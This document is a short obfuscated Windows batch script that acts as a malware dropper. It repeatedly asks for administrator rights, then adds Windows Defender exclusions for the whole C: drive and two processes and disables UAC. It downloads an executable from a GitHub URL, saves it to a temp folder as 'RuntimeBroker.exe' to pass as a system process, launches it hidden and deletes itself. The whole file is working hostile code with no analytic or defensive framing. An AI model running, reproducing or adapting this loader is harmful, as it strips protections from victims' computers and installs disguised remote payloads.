@echo off & setlocal enableDelayedExpansion
set "NGi=SESSION" & set "hecp=2>&1" & set "ZKOJ=>nul" & set "KtQHh=NET"
%KtQHh% %NGi% %ZKOJ% %hecp%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "UTd=foo" & set "XlhF=qux" & set "nZDI=bar" & set "bhI=baz" & rem qyjCbc RySmR ExEtDfh
set "Loa=powershell -ExecutionPolicy Bypass -Command"
set "hfHLd=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!Loa! "!hfHLd!" %ZKOJ% %hecp%
set "GCs=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
!Loa! "!GCs!" %ZKOJ% %hecp%
set "wzvex=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!Loa! "!wzvex!" %ZKOJ% %hecp%
if !errorlevel! neq 0 (goto %a%)
set "eWK=timeout /t" & !eWK! 2 %ZKOJ% %hecp%
set "OqvS=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!Loa! "!OqvS!" %ZKOJ% %hecp%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!eWK! 1 %ZKOJ% %hecp% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %ZKOJ% %hecp%
del /f /q "%~f0" %ZKOJ% %hecp%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %ZKOJ% %hecp%
if !errorlevel! neq 0 (!eWK! 3 %ZKOJ% %hecp% & goto %b%)
exit /b
